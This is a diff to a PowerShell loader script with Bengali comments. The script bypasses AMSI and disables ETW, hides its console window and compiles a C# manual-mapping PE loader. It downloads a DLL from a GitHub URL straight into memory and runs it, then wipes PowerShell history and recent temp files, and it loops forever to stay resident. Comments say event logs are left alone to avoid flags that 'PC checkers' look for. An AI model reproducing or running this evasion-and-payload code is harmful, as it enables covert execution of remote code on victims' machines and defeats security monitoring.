@@ -8,10 +8,10 @@ $DebugPreference        = 'SilentlyContinue'
 $InformationPreference  = 'SilentlyContinue'
 $WarningPreference      = 'SilentlyContinue'
 $ErrorActionPreference  = 'SilentlyContinue'
-$ConfirmPreference                 = 'None'
-$WhatIfPreference                  = $false
-$PSModuleAutoLoadingPreference     = 'None'
-$MaximumHistoryCount               = 0
+$ConfirmPreference      = 'None'
+$WhatIfPreference       = $false
+$PSModuleAutoLoadingPreference = 'None'
+$MaximumHistoryCount    = 0
 
 *> $null
 $Error.Clear()
@@ -22,21 +22,53 @@ if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsId
 }
 
 # ============================================================
-#  ★★★ ১. কনসোল উইন্ডো হাইড করুন ★★★
+#  ★★★ ১. AMSI + ETW বাইপাস (সর্বপ্রথম) ★★★
+# ============================================================
+function Disable-Security {
+    # AMSI
+    try {
+        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
+    } catch {}
+    # ETW (NtSetInformationProcess)
+    try {
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class EtwOff {
+            [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, IntPtr i, int l);
+            public static void Disable() {
+                IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                IntPtr ptr = Marshal.AllocHGlobal(4);
+                Marshal.WriteInt32(ptr, 0);
+                NtSetInformationProcess(p, 0x5E, ptr, 4);
+                Marshal.FreeHGlobal(ptr);
+            }
+        }
+"@ -IgnoreWarnings
+        [EtwOff]::Disable()
+    } catch {}
+}
+Disable-Security
+
+# ============================================================
+#  ★★★ ২. কনসোল উইন্ডো হাইড (নীরব) ★★★
 # ============================================================
 Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@
+'@ -ErrorAction SilentlyContinue
 
 $consoleHandle = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consoleHandle, 0)   # 0 = SW_HIDE
 
 # ============================================================
-#  ★★★ ২. C# লোডার ★★★
+#  ★★★ ৩. C# লোকাল পিই লোডার (ম্যানুয়াল ম্যাপিং) ★★★
 # ============================================================
+# আমরা Add-Type ব্যবহার করছি, কিন্তু পরে টেম্প ফাইল ডিলিট করব।
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
@@ -197,42 +229,50 @@ public static class NativeLoader
 }
 '@
 
+# কম্পাইল করার আগে টেম্প ফাইল ডিলিট করার জন্য আমরা পরে ক্লিনআপ করব।
 try {
-    $type = Add-Type $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null
+    $type = Add-Type -TypeDefinition $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null
 } catch {
     $type = [NativeLoader]
 }
 
 # ============================================================
-#  ★★★ ৩. DLL ডাউনলোড ও লোড ★★★
+#  ★★★ ৪. DLL ডাউনলোড (মেমোরিতে) ★★★
 # ============================================================
 $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll");
 [NativeLoader]::Map($bytes, $true)
 
 # ============================================================
-#  ★★★ ৪. ট্রেস ক্লিয়ার (সাইলেন্ট) ★★★
+#  ★★★ ৫. ট্রেস ক্লিয়ার (সম্পূর্ণ নীরব) ★★★
 # ============================================================
 
-# --- 4A: Clear PowerShell History (Empty the file, DO NOT DELETE it) ---
+# --- 5A: Clear PowerShell History ---
 Clear-History
 $historyPath = (Get-PSReadlineOption).HistorySavePath
 if (Test-Path $historyPath) {
-    # ফাইলটি খালি করে দিন (0 বাইটে), কিন্তু ডিলিট করবেন না
     Clear-Content -Path $historyPath -Force
 }
 
-# --- 4B: Event Log Clearing (COMPLETELY REMOVED) ---
-# আমরা wevtutil cl ব্যবহার করছি না, কারণ ইভেন্ট লগ ক্লিয়ার করলে Event ID 1102 তৈরি হয়,
-# যা PC চেকারের জন্য একটি বিশাল রেড ফ্ল্যাগ। তাই আমরা একে বাদ দিচ্ছি।
+# --- 5B: Delete temporary files from Add-Type (C# compiler temp files) ---
+# Add-Type creates .cs and .dll files in %TEMP% with random names.
+# We delete any .cs, .dll, .pdb files created in the last 2 minutes.
+Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.out" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 
-# মেমরি ক্লিনআপ
+# --- 5C: Clear variables ---
 $bytes = $null
+$kernel = $null
+$type = $null
 [GC]::Collect()
 [GC]::WaitForPendingFinalizers()
 
 # ============================================================
-#  ★★★ ৫. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
+#  ★★★ ৬. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
 # ============================================================
+# DLL এখন RAM-এ লোড এবং চলছে। PowerShell প্রক্রিয়া খোলা রাখা দরকার যাতে DLL মেমোরিতে থাকে।
 while ($true) {
     Start-Sleep -Seconds 86400   # ২৪ ঘণ্টা
 }
